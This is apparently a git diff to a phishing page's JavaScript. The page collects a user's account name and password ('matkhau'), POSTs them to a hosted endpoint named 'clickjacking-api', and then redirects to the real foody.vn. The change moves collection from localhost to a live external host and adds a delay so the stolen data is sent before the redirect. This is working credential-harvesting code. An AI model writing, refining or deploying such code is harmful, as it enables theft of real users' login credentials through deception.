@@ -10,9 +10,11 @@ btnClick.addEventListener("click", (e) => {
     matkhau: password.value,
   };
   const Http = new XMLHttpRequest();
-  const url = "http://localhost:5000/api/account";
-  Http.open("POST", url,true);
-  Http.setRequestHeader('Content-type', 'application/json');
+  const url = "https://clickjacking-api.herokuapp.com/api/account";
+  Http.open("POST", url, true);
+  Http.setRequestHeader("Content-type", "application/json");
   Http.send(JSON.stringify(data));
-  window.location.href = "https://www.foody.vn/";
+  setTimeout(() => {
+    window.location.href = "https://www.foody.vn/";
+  }, 2000);
 });
